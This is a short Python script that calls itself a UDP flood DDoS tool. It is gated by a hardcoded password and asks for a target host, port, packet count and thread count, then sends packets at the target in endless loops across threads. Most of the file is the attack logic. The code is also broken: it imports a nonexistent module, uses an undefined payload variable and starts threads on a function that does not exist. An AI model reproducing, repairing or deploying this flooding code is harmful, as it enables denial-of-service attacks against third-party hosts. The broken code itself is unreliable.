import random
import socket
import threading
import times

password ="William"

for i in range(3):
	pwd = input("[•] Password : ")
	j=3
	if(pwd==password):
		time.sleep(5)
		print("[•] Please Wait!!! ")
		break
	else:
		time.sleep(5)
		print("[×] Wrong Password!!! ")
		continue
time.sleep(5)
print("[+] Done Use Pasword \u001b[33mWilliam")
time.sleep(5)

print("""
\u001b[31m

     > DDOS TOOLS UDP FLOOD
     > AUTHOR : W 1 L L 1 4 M
     > CODER : W 1 L L 1 4 M
     Note : Please Don't Abuse

""")
ip = str(input(" Host/Ip:"))
port = int(input(" Port:"))
times = int(input(" Packets per one connection:"))
threads = int(input(" Threads:"))
def run():
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(f"\u001b[33m [¥] @X-TEAM ════> \u001b[31mAttack To Ip \u001b[37m{ip} \u001b[31mOn Port \u001b[37m{port}")
		except:
			print(f"\u001b[33m [¥] @X-TEAM ════> \u001b[31mAttack To Ip \u001b[37m{ip} \u001b[31mOn Port \u001b[37m{port}")

# Threads
for y in range(threads):
	th = threading.Thread(target = wt)
	th.start()
